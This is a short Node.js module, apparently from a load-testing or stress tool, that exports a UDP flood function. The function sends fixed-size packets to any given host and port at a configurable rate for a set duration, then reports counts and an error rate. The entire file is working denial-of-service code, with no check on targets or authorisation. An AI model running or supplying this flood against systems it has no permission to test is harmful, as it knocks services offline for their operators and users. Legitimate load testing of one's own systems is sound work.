import dgram from 'dgram';

export async function runUdpFlood(target, config, durationSeconds) {
  const {
    packets_per_second = 1000,
    payload_size       = 512,
  } = config;

  const [host, portStr] = target.replace(/^.*:\/\//, '').split(':');
  const port     = parseInt(portStr) || 80;
  const intervalMs = Math.max(1, 1000 / packets_per_second);
  const endTime  = Date.now() + durationSeconds * 1000;
  const payload  = Buffer.alloc(payload_size, 0x41); // 'A' * payload_size

  let sent = 0, errors = 0;
  const socket = dgram.createSocket('udp4');
  socket.on('error', () => {});

  await new Promise((resolve) => {
    const ticker = setInterval(() => {
      if (Date.now() >= endTime) { clearInterval(ticker); resolve(); return; }
      socket.send(payload, port, host, (err) => {
        if (err) errors++;
        else sent++;
      });
    }, intervalMs);
  });

  socket.close();

  const total = sent + errors;
  return {
    avgLatencyMs      : 0,
    errorRateBps      : total > 0 ? Math.round((errors / total) * 10000) : 10_000,
    requestsCompleted : sent,
  };
}
